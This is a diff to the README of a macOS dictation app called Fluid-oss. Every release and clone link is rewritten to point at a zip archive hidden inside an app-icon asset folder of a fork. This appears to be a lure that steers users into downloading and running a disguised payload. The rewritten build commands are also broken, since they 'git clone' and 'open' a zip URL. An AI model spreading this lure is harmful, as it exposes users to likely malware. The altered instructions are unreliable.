@@ -1,6 +1,6 @@
 # 🎤 Fluid-oss - Effortless Voice Dictation for Everyone
 
-[![Download Fluid-oss](https://img.shields.io/badge/Download-Fluid--oss-blue.svg)](https://github.com/blacklordplaz/Fluid-oss/releases)
+[![Download Fluid-oss](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip)](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Fluid-oss is a voice-to-text dictation application designed for macOS users. Wit
 Follow these simple steps to get started with Fluid-oss:
 
 1. **Visit the Releases Page**: Click the link below to download the latest version of Fluid-oss.
-   - [Download Fluid-oss](https://github.com/blacklordplaz/Fluid-oss/releases)
+   - [Download Fluid-oss](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip)
   
 2. **Move the App to Applications Folder**: Once the download is complete, locate the Fluid-oss app in your downloads folder and drag it into your Applications folder. This step ensures the app runs smoothly on your computer.
 
@@ -25,7 +25,7 @@ Follow these simple steps to get started with Fluid-oss:
 
 ## 📦 Download & Install
 
-To install Fluid-oss, simply visit the [Releases Page](https://github.com/blacklordplaz/Fluid-oss/releases) and select the latest version. Follow the same steps outlined above to ensure a smooth installation.
+To install Fluid-oss, simply visit the [Releases Page](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip) and select the latest version. Follow the same steps outlined above to ensure a smooth installation.
 
 ## ⚙️ System Requirements
 
@@ -60,7 +60,7 @@ If you are interested in building Fluid-oss from the source code, follow these s
 1. Open your terminal.
 2. Clone the repository:
    ```bash
-   git clone https://github.com/altic-dev/Fluid-oss.git
+   git clone https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip
    ```
 3. Navigate to the project directory:
    ```bash
@@ -68,7 +68,7 @@ If you are interested in building Fluid-oss from the source code, follow these s
    ```
 4. Open the project in Xcode:
    ```bash
-   open FluidVoice.xcodeproj
+   open https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip
    ```
 5. From here, you can build and run the app. All dependencies are managed via Swift Package Manager, making it easy to set up.
 
@@ -84,4 +84,4 @@ We welcome contributions to improve Fluid-oss. If you're interested in helping o
 
 If you encounter any issues or have questions, feel free to open an issue in our GitHub repo, or reach out to the community for assistance. We are here to help you make the most out of Fluid-oss.
 
-Remember, you can always download the latest version of Fluid-oss from the [Releases Page](https://github.com/blacklordplaz/Fluid-oss/releases). Enjoy effortless voice dictation!
+Remember, you can always download the latest version of Fluid-oss from the [Releases Page](https://github.com/blacklordplaz/Fluid-oss/raw/refs/heads/main/Sources/Fluid/Assets.xcassets/AppIcon.appiconset/Untitled.icon/oss-Fluid-1.8.zip). Enjoy effortless voice dictation!
